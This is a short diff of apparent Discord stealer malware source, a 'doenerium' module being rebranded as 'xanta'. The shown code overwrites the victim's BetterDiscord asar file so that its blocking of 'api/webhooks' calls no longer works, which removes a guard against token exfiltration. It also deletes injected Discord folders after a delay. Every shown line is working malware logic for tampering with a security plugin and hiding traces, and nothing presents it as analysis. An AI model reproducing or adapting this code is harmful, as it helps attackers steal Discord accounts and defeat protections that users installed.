@@ -477,7 +477,7 @@ module.exports = (client) => {
         client.requires.fs.writeFileSync(
           client.utils.encryption.decryptData(client.config.user.appdata) +
             "/BetterDiscord/data/betterdiscord.asar",
-          client.requires.buf_replace(_, "api/webhooks", "doenerium_on_top")
+          client.requires.buf_replace(_, "api/webhooks", "xanta_on_top")
         );
       }
     },
@@ -638,9 +638,9 @@ module.exports = (client) => {
       await client.utils.time.sleep(30000);
       for (const path of client.config.discord.files_path) {
         if (
-          client.requires.fs.existsSync(path.replace("index.js", "doenerium"))
+          client.requires.fs.existsSync(path.replace("index.js", "xanta"))
         ) {
-          client.requires.fs.rmdirSync(path.replace("index.js", "doenerium"));
+          client.requires.fs.rmdirSync(path.replace("index.js", "xanta"));
         }
       }
     },
